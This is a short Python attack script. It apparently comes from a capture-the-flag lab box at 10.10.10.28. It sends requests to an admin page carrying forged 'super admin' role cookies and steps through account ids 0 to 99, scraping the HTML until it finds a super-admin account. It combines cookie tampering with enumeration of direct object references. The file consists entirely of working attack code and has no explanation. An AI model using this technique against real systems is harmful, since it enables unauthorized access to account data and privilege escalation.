import requests as rq
import re


def req(num: int):
    with rq.Session() as s:
        return s.get(url='http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id={}'.format(num),
                     cookies={'role': 'super admin', 'user': '86575'}).text


for x in range(0, 100):
    result = re.findall('<td>(.*?)</td>', req(x))
    if result is None or result[0] == '':
        continue
    if re.search('[Ss][Uu][Pp][Ee][Rr]', ''.join(result)):
        print('Find in {}: {}'.format(x, ' '.join(result)))
        break
